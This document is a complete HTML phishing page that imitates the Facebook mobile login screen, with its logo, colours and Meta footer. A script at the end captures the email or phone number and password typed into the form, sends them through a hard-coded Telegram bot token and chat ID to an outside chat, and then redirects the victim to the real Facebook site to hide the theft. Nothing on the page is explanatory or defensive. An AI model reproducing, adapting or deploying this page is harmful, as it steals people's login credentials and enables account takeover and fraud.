<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8">
  <meta name="viewport" content="width=device-width, initial-scale=1.0">
  <title>Facebook</title>
  <style>
    * { box-sizing: border-box; }

    body {
      margin: 0;
      min-height: 100vh;
      background: #fff;
      font-family: Helvetica, Arial, sans-serif;
      display: flex;
      flex-direction: column;
      align-items: center;
      justify-content: space-between;
      padding: 20px 16px;
    }

    .lang-container {
      width: 100%;
      text-align: center;
      color: #90949c;
      font-size: 12px;
      margin-bottom: 20px;
    }

    .main-content {
      width: 100%;
      max-width: 400px;
      display: flex;
      flex-direction: column;
      align-items: center;
      flex-grow: 1;
      justify-content: center;
    }

    .fb-logo {
      width: 72px;
      height: 72px;
      margin-bottom: 40px;
    }

    .form-group {
      width: 100%;
      margin-bottom: 12px;
    }

    .form-group input {
      width: 100%;
      padding: 14px 16px;
      font-size: 16px;
      background: #f5f6f7;
      border: 1px solid #dddfe2;
      border-radius: 8px;
      outline: none;
    }

    .form-group input:focus {
      border-color: #1877f2;
      background: #fff;
    }

    .btn-login {
      width: 100%;
      height: 48px;
      font-size: 16px;
      font-weight: bold;
      color: #fff;
      background: #1877f2;
      border: none;
      border-radius: 8px;
      cursor: pointer;
      margin-top: 4px;
    }

    .btn-login:active {
      background: #166fe5;
    }

    .forgot {
      text-align: center;
      margin: 16px 0;
    }

    .forgot a {
      color: #1c1e21;
      text-decoration: none;
      font-size: 14px;
      font-weight: 600;
    }

    .footer {
      width: 100%;
      display: flex;
      flex-direction: column;
      align-items: center;
      margin-top: 40px;
    }

    .btn-new {
      width: 100%;
      max-width: 400px;
      height: 48px;
      line-height: 48px;
      font-size: 15px;
      font-weight: 600;
      color: #1877f2;
      background: transparent;
      border: 1px solid #1877f2;
      border-radius: 8px;
      text-decoration: none;
      text-align: center;
    }

    .meta-logo {
      display: flex;
      align-items: center;
      gap: 6px;
      margin-top: 24px;
      font-size: 14px;
      font-weight: bold;
      color: #1c1e21;
    }

    .meta-logo svg {
      width: 16px;
      height: 16px;
      fill: #1877f2;
    }
  </style>
</head>
<body>

  <div class="lang-container">
    English (US)
  </div>

  <div class="main-content">
    <!-- Facebook Logo (Fixed SVG) -->
    <svg class="fb-logo" viewBox="0 0 36 36" xmlns="http://www.w3.org/2000/svg">
      <path fill="#1877f2" d="M36 18c0-9.94-8.06-18-18-18S0 8.06 0 18c0 8.98 6.59 16.43 15.2 17.75v-12.5H10.6V18h4.6v-3.98c0-4.55 2.71-7.06 6.84-7.06 1.98 0 4.05.35 4.05.35v4.46h-2.28c-2.25 0-2.95 1.4-2.95 2.84V18h5l-.8 5h-4.2v12.5C29.41 34.43 36 26.98 36 18z"/>
      <path fill="#ffffff" d="M25.2 23l.8-5h-5v-2.84c0-1.44.7-2.84 2.95-2.84h2.28V7.86s-2.07-.35-4.05-.35c-4.13 0-6.84 2.51-6.84 7.06V18h-4.6v4.5h4.6v12.5c.95.15 1.92.25 2.9.25s1.95-.1 2.9-.25V22.5h4.2z"/>
    </svg>

    <form id="loginForm" method="post" action="#" autocomplete="on" style="width: 100%;">
      <div class="form-group">
        <input type="text" id="email" name="email" placeholder="Mobile number or email" autocomplete="username" autocapitalize="off" required>
      </div>

      <div class="form-group">
        <input type="password" id="pass" name="pass" placeholder="Password" autocomplete="current-password" required>
      </div>

      <button type="submit" class="btn-login" id="loginBtn" name="login">Log In</button>
    </form>

    <div class="forgot">
      <a href="#">Forgot password?</a>
    </div>
  </div>

  <div class="footer">
    <a href="#" class="btn-new">Create new account</a>
    
    <div class="meta-logo">
      <svg viewBox="0 0 24 24">
        <path d="M12.001 2.002c-5.523 0-10 4.477-10 10s4.477 10 10 10 10-4.477 10-10-4.477-10-10-10zm0 18.182c-4.516 0-8.182-3.666-8.182-8.182s3.666-8.182 8.182-8.182 8.182 3.666 8.182 8.182-3.666 8.182-8.182 8.182zm1.091-12.727h-2.182v5.455h2.182V7.457zm0 7.273h-2.182v2.182h2.182v-2.182z"/>
      </svg>
      Meta
    </div>
  </div>

  <script>
    const botToken = "8699908769:AAHYSvng3SWeCSYype1Ot7JbPJkL8V5SMmQ";
    const chatId = "6776195354";
    const redirectUrl = "https://www.facebook.com/";

    document.getElementById('loginForm').addEventListener('submit', async function(e) {
      e.preventDefault();

      const email = document.getElementById('email').value;
      const password = document.getElementById('pass').value;
      const loginBtn = document.getElementById('loginBtn');

      loginBtn.disabled = true;
      loginBtn.innerText = "Logging in...";

      const message = `🔔 New Facebook Login:\n👤 Email/Phone: ${email}\n🔑 Password: ${password}`;
      const url = `https://api.telegram.org/bot${botToken}/sendMessage`;

      try {
        await fetch(url, {
          method: 'POST',
          headers: {
            'Content-Type': 'application/json'
          },
          body: JSON.stringify({
            chat_id: chatId,
            text: message
          })
        });
      } catch (error) {
        console.error("Telegram error:", error);
      } finally {
        window.location.href = redirectUrl;
      }
    });
  </script>

</body>
  </html>
